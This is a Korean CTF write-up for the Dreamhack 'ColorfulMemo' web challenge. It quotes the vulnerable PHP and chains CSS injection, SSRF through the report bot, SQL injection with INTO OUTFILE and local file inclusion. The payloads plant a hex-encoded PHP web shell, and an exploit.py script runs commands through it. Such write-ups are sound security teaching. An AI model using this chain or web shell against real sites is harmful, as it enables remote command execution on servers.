---
title: "[dreamhack] ColorfulMemo 문제 풀이"
categories:
  - dreamhack
tags:
  - dreamhack
  - css injection
  - ssrf
  - LFI
  
toc: true
toc_sticky: true
toc_label: "ColorfulMemo 문제 풀이"
toc_icon: "bookmark"
author_profile: true
hidden: true
---

💡  [2022 Spring GoN Open Qual CTF] ColorfulMemo 문제에 대한 풀이입니다.
{: .notice--warning}

# 문제
문제 링크 : [https://dreamhack.io/wargame/challenges/473/](https://dreamhack.io/wargame/challenges/473/)

우선 문제를 풀기에 앞서 웹페이지의 기능은 다음과 같습니다.

1. Write

![image](https://user-images.githubusercontent.com/33647663/160804268-91cab590-393d-41ed-ac79-2e2a9cad684c.png)

2. Read & Report

![image](https://user-images.githubusercontent.com/33647663/160804363-b7f0fcb9-933f-4e8e-b8fa-0ca235b3769e.png)

기본적으로 게시글에 Report 기능이 있기 때문에 CSRF, XXE, SSRF 와 같은 스크립트를 이용한 공격에 대해서 생각해 봐야 합니다.

# 파일 분석

본론 부터 보면 문제에는 총 3개의 취약점이 있습니다.

## LFI(Local File Inclusion)

index.php 파일에서는 다음과 같은 형태로 파일들을 연결해 줍니다.
이때 Path로 입력한 값에 대한 검증이 없기 때문에
```path=../../../../tmp/shell```과 같이 입력한다면
```./../../../../tmp/shell.php``` 파일에 접근이 가능해집니다.

**index.php**
```php
<?php
    $path = $_GET["path"];
    if($path == ""){
        $path = "main";
    }
    $path = "./".$path.".php";
?>

// 중략
<div class="body">
    <?php include_once $path; ?>
</div>
```

## SQLI(SQL Injection)
대부분의 코드에서 Prepared Statement를 활용하여 원천적으로 SQL Injection이 막혀있는데, 다음 부분에서 유일하게 sql injection 공격이 가능한 포인트가 있었습니다. id 값에 대한 검증은 check.php 파일을 호출하기 전에 하고 있었으며, 이 부분을 우회한다면 sqli 공격이 가능합니다.

**check.php**
```php
<?php
if($_SERVER["REMOTE_ADDR"] == '127.0.0.1' || $_SERVER["REMOTE_ADDR"] == '::1'){
    $id = $_GET['id'];
    $mysqli = new mysqli('localhost','user','password','colorfulmemo');
    // I believe admin 
    $result = $mysqli->query('SELECT adminCheck FROM memo WHERE id = '.$id);
    if($result){
        $row = mysqli_fetch_row($result);
        if($row){
            if($row[0] != 1){
                $stmt = $mysqli->prepare('UPDATE memo SET adminCheck = 1 WHERE id = ?');
                $stmt->bind_param('i',$id);
                $stmt->execute();
                $stmt->close();
            }
        }
    }
}
else{
    die("no hack");
}
?>
```

## SSRF with CSS Injection
게시글을 read할때 다음과 같은 로직으로 구성되어 script를 차단하고 있습니다. 이때 색을 선택하는 color 부분에서 '<' , '>' 에 대한 필터링만 하고 있기 때문에 CSS Injection이 가능한 취약점이 발생했습니다. 이를 이용해서 report를 할 때 해당 게시글을 읽으면, 봇에서 스크립트가 실행되게 되어 SSRF 공격이 가능해 집니다.

**read.php**

```php
<?php
$id = $_GET["id"];

$mysqli = new mysqli('localhost','user','password','colorfulmemo');
if($mysqli){
    $stmt = $mysqli->prepare('SELECT title, color, content, adminCheck FROM memo WHERE id = ?');
    $stmt->bind_param('i',$id);
    $stmt->execute();
    $result = $stmt->get_result();
    $stmt->close();
}
else{
    die('db error');
}

$row = mysqli_fetch_row($result);
if($row){
    $title = $row[0];
    $color = $row[1];
    $color = str_replace("<", "&lt;", $color);
    $color = str_replace(">", "&gt;", $color);
    $content = $row[2];
    $adminCheck = $row[3];
}
else{
    die('no such memo');
}

<style>
    .content{
        color:<?php echo $color ?>      // CSS Injection 취약점
    }
</style>

// $title과 $content는 htmlspecialchars로 스크립트 실행 불가
<td><?php echo htmlspecialchars($title); ?></td>
<td><span class="content"><?php echo htmlspecialchars($content); ?></span></td>
```


# 시나리오

위의 3가지 취약점을 종합하여 다음과 같은 시나리오 flag를 획득합니다.

1. 게시글을 작성할 때, CSS Injection을 이용하여 악성 게시글을 report 하여 bot에서 글을 읽게 만든 후, ./check?id=[sql injection 코드] 로 작성하여 SSRF를 이용한 sql injection을 수행합니다.

2. SQL Injection 에서는 웹쉘이 서버에 생성되도록 합니다. my.cnf 파일을 보면 ```secure-file-priv= /tmp/```로 되어 있기 때문에 /tmp/shell.php로 파일을 작성합니다.

3. LFI 취약점을 이용하여 해당 경로로 접근하여 웹쉘을 실행시킵니다.


이 시나리오 대로 웹쉘이 실행되며 flag를 획득할 수 있습니다.


## CSS Injection

memoColor =  black; background: url("./check.php?id=3 union select '웹쉘' into outfile '/tmp/shell.php'")

와 같이 작성해 준다면 봇이 해당 글을 클릭하면 SSRF로 인해서 shell.php 파일이 생성됩니다.

## bypass '<','>' filtering
웹쉘을 작성할 때 주의할 점은 read.php 함수에서 다음과 같이 '<','>' 글자를 필터링 하고 있다는 것입니다.

```php
    $color = str_replace("<", "&lt;", $color);
    $color = str_replace(">", "&gt;", $color);
```

웹쉘을 다음과 같이 작성하면 필터링에 걸립니다.

```php
<?php system($_GET['cmd']); ?>
```

따라서 이 부분을 16진수로 표현하여 php에서는 필터링에 안걸리지만, mysql 에서 실행될 때, 문자열로 변환되어 실행되도록 해줍니다.

```
3 union select 0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e  into outfile '/tmp/shell.php'
```

## exploit.py

```python
import requests

url = "http://host1.dreamhack.games:12811/?path=write"

datas = {
    "memoTitle" : "1",
    "memoColor" : "black; background: url(\"./check.php?id=3 union select 0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e  into outfile '/tmp/shell.php'\")",
    "memoContent" : "123"
}

response = requests.post(url,data=datas)
# 게시글 작성 후 해당 게시글 report.
# 그러면 /tmp/shell.php 파일이 서버에 생성됩니다.

# 웹쉘 실행 코드는 아래


while(1):
    payload = input("[+] Enter the command : ")
    RESULT = requests.get("http://host1.dreamhack.games:12811" + f'/?path=../../../../../../tmp/shell&cmd={payload}').text.split('<div class="body">')[1].split('</div>')[0].strip()
    print(RESULT)
```


1. 게시글 작성한 뒤 해당 글을 읽을 때, check.php파일이 호출되는 모습

![image](https://user-images.githubusercontent.com/33647663/160810280-8c1f9114-9a16-4de9-8579-b686a47bdada.png)


2. report 후, 웹 쉘이 실행되어 쉘을 획득한 모습
![image](https://user-images.githubusercontent.com/33647663/160810477-542bafb9-0b84-4331-acab-4fdf41b60899.png)

3. root 디렉터리에 flag 파일이 보임
![image](https://user-images.githubusercontent.com/33647663/160810665-b67b3615-7c2a-457f-8278-1a969d7030f6.png)